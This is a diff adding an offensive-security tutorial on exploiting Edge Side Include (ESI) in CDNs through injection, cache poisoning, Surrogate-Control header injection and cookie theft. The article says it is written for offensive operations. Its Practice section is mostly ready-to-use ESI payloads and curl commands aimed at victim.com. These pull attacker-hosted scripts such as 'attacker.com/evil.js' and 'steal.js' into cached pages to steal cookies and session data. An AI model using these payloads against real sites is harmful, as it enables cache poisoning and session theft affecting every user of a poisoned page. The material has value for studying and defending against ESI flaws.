@@ -1,0 +1,135 @@
+---
+title: 'Exploiting Edge Side Inclusion: Injection & Cache Attacks'
+description: Learn how to exploit Edge Side Include (ESI) vulnerabilities for cache
+  poisoning and data exfiltration in CDN networks.
+keywords:
+- Edge Side Include
+- ESI Injection
+- Cache Poisoning
+- CDN Exploitation
+- Surrogate-Control Header
+- Header Manipulation
+- Exfiltration
+---
+
+# Edge Side Inclusion
+
+## Context
+
+This article focuses on leveraging Edge Side Includes (ESI) for offensive operations. The goal is to teach how ESI can be exploited to perform injection attacks, cache poisoning, and data exfiltration through edge or content delivery network (CDN) infrastructures. Assumed knowledge for readers includes understanding of HTTP headers, web caching mechanisms, content delivery networks, edge computing, and Server Side Include Injection.
+
+## Theory
+
+### Edge Side Includes (ESI) Processing Model
+
+Edge Side Includes (ESI) is a simple markup language used to dynamically assemble web content at the edge of a network, typically on CDN servers. ESI tags are parsed and executed by edge servers before the content is delivered to the client, providing a mechanism for dynamic content delivery while maintaining cacheability. However, this process may open vulnerabilities if untrusted input is improperly validated, enabling potential injection attacks.
+
+### Attack Surface: ESI Injection and Edge Processing Abuse
+
+- **Attack Sequence:** An attacker can inject ESI tags into cacheable content, causing the edge server to execute the injected logic.
+- **Protocol Weakness:** Headers like Surrogate-Control can expand ESI processing scope when manipulated by an attacker.
+- **Implementation Flaw:** Certain CDN services, such as Fastly, Akamai, and Varnish, allow ESI in user-controlled responses or headers, potentially enabling exploitation.
+
+### ESI Payloads and Exploitation Primitives
+
+- **<esi:include>:** This ESI command fetches and includes remote content during the server's response assembly.
+- **<esi:vars> and <esi:choose>:** These elements enable logic and variable expansion in edge responses, making the attack scope wide-ranging.
+- **Attack Sequence:** ESI payloads can be crafted to exfiltrate cookies, inject malicious JavaScript, or poison the cache serving all subsequent users.
+
+### Edge Cache Poisoning via ESI
+
+The fundamental principle of edge cache poisoning involves the injection of ESI tags into cacheable responses. These ESI tags persist in the cache and execute every time a subsequent user requests the content, allowing the attacker to control the content served from the cache.
+
+### Header Manipulation and Surrogate Tag Abuse
+
+- **Surrogate-Control Definition:** The Surrogate-Control header directs the edge/CDN to parse ESI in HTTP responses.
+- **Attack Sequence:** By injecting the "Surrogate-Control: content=\"ESI/1.0\"" header, an attacker can enable ESI parsing on statutory non-dynamic content.
+
+## Practice
+
+### Injecting ESI Payloads into Cacheable Content
+
+- Identify a cacheable endpoint that reflects user input in the response body. The target must be processed by an ESI-capable edge or CDN.
+- Inject the following ESI tag into the reflected input:
+  
+    ```xml
+    <esi:include src="https://attacker.com/evil.js"/>
+    ```
+
+- Send the payload to the endpoint, ensuring the response is cached:
+
+    ```bash
+    curl -H 'Host: victim.com' 'https://victim.com/page?name=<esi:include%20src="https://attacker.com/evil.js"/>'
+    ```
+
+  Outcome: The edge server fetches and includes the attacker's content in responses to all users who request the cached resource.
+
+### Enabling ESI Processing via Surrogate-Control Header Injection
+
+- Find an endpoint where you can inject or control HTTP response headers. Applications that reflect header values or allow header injection are ideal targets.
+- Inject the following header to enable ESI parsing:
+
+    ```http
+    Surrogate-Control: content="ESI/1.0"
+    ```
+
+- Inject the following ESI tag into the response body:
+
+    ```xml
+    <esi:include src="https://attacker.com/evil.js"/>
+    ```
+
+- Trigger both header and body injection:
+
+    ```bash
+    curl -H 'X-Injected-Header: Surrogate-Control: content="ESI/1.0"' 'https://victim.com/page?name=<esi:include%20src="https://attacker.com/evil.js"/>'
+    ```
+
+  Outcome: The edge server parses ESI in responses that normally would not be processed, expanding the attack surface.
+
+### Edge Cache Poisoning with Persistent ESI
+
+- Locate a cacheable endpoint where injected ESI persists in the cache. Persistence is necessary for poisoning to affect multiple users.
+- Inject the following ESI tag into the cacheable response:
+
+    ```xml
+    <esi:include src="https://attacker.com/evil.js"/>
+    ```
+
+- Prime the cache with the malicious payload:
+
+    ```bash
+    curl -H 'Host: victim.com' 'https://victim.com/page?comment=<esi:include%20src="https://attacker.com/evil.js"/>'
+    ```
+
+- Ensure subsequent users receive attacker-controlled content from the cache:
+
+    ```bash
+    curl -H 'Host: victim.com' 'https://victim.com/page?comment=anything'
+    ```
+
+  Outcome: Malicious content is served to all users, enabling data theft or further exploitation.
+
+### ESI-Based Cookie Theft via Inline JavaScript
+
+- Inject ESI that includes attacker-hosted JavaScript into a cacheable response. This JavaScript can execute in victim browsers if not properly sanitized.
+
+- Inject the following payload, ensuring it exfiltrates cookies or session data:
+
+    ```xml
+    <esi:include src="https://attacker.com/steal.js"/>
+    ```
+
+- Inject the payload and ensure it is cached:
+
+    ```bash
+    curl -H 'Host: victim.com' 'https://victim.com/page?msg=<esi:include%20src="https://attacker.com/steal.js"/>'
+    ```
+
+  Outcome: Victim browsers execute the attacker's JavaScript, leaking cookies or session data.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **mitmproxy**
